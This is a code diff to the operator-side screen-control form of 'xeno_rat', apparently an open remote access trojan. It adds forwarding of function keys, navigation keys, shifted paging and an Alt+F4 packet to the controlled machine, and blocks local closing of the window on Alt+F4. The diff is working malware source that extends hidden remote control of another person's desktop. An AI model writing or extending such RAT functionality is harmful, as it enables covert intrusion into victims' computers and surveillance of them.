@@ -10,6 +10,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using static System.Windows.Forms.AxHost;
 
 namespace xeno_rat_server.Forms
 {
@@ -693,6 +694,21 @@ namespace xeno_rat_server.Forms
                 if (e.KeyCode == Keys.V) { await SendKeyComboAsync(Keys.ControlKey, Keys.V); e.Handled = true; return; }
             }
 
+            if (e.KeyCode == Keys.F1 || e.KeyCode == Keys.F2 || e.KeyCode == Keys.F3 || e.KeyCode == Keys.F4 || e.KeyCode == Keys.F5 || e.KeyCode == Keys.F6 ||
+                e.KeyCode == Keys.F7 || e.KeyCode == Keys.F7 || e.KeyCode == Keys.F8 || e.KeyCode == Keys.F9 || e.KeyCode == Keys.F10 || e.KeyCode == Keys.F11 || e.KeyCode == Keys.F12)
+            {
+                await SendKeyAsync(e.KeyCode); 
+                e.Handled = true;
+                return;
+            }
+
+            if (e.KeyCode == Keys.Insert || e.KeyCode == Keys.Delete || e.KeyCode == Keys.Home || e.KeyCode == Keys.End)
+            {
+                await SendKeyAsync(e.KeyCode);
+                e.Handled = true;
+                return;
+            }
+
             /*if (e.Shift)
             {
                 await SendKeyComboAsync(Keys.Shift, e.KeyCode);
@@ -729,6 +745,13 @@ namespace xeno_rat_server.Forms
             }
 
             if (shiftDown && (actualKey == Keys.Up || actualKey == Keys.Down || actualKey == Keys.Left || actualKey == Keys.Right))
+            {
+                _ = SendShiftedArrowKeyAsync(actualKey);
+                e.Handled = true;
+                return;
+            }
+
+            if (shiftDown && (actualKey == Keys.PageUp || actualKey == Keys.PageDown))
             {
                 _ = SendShiftedArrowKeyAsync(actualKey);
                 e.Handled = true;
@@ -922,10 +945,33 @@ namespace xeno_rat_server.Forms
             }
         }
 
+        private async Task sendAltF4Async(int state, bool extended = false)
+        {
+            byte[] shiftBytes = client.sock.IntToBytes((int)Keys.Alt | (state << 16));
+            byte[] arrowBytes = client.sock.IntToBytes((int)Keys.F4 | (state << 16));
+
+            // Packet header for type 17 (Alt+F4 combo)
+            byte[] header = new byte[] { 17 };
+
+            // Combine all arrays
+            byte[] packet = client.sock.Concat(header, shiftBytes);
+            packet = client.sock.Concat(packet, arrowBytes);
+
+            // Send packet
+            await client.SendAsync(packet);
+        }
+
         protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
         {
             if (!playing || !checkBox1.Checked || current_mon_size == null || pictureBox1.Image == null)
                 return base.ProcessCmdKey(ref msg, keyData);
+
+            if (keyData == (Keys.Alt | Keys.F4))
+            {
+                sendAltF4Async(1, false);
+                // Intercept Alt+F4
+                return true; // prevent default processing
+            }
 
             // Intercept Tab key
             if (keyData == Keys.Space || keyData == Keys.Tab || keyData == Keys.Enter || keyData == Keys.Escape || keyData == Keys.LWin || keyData == Keys.RWin || keyData == Keys.Escape
@@ -948,6 +994,15 @@ namespace xeno_rat_server.Forms
         private void pictureBox1_SizeChanged(object sender, EventArgs e)
         {
             UpdateScaleSize();
+        }
+
+        private void ScreenControl_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            if (Control.ModifierKeys.HasFlag(Keys.Alt) && e.CloseReason == CloseReason.UserClosing)
+            {
+                e.Cancel = true; // cancel closing
+                                 // Optionally do something else
+            }
         }
     }
 }
